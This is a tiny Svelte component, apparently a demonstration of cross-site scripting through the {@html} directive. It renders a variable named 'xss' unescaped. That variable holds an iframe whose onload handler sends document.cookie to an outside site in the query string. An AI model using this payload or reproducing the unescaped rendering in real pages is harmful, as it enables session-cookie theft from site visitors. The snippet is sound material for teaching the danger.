<script>
  let h1 = "<h1>Hello Yujin</h1>";
  let xss =
    "<iframe onload='document.location=`https://naver.com?${document.cookie}`'></iframe>";
</script>

{@html h1}
{@html xss}
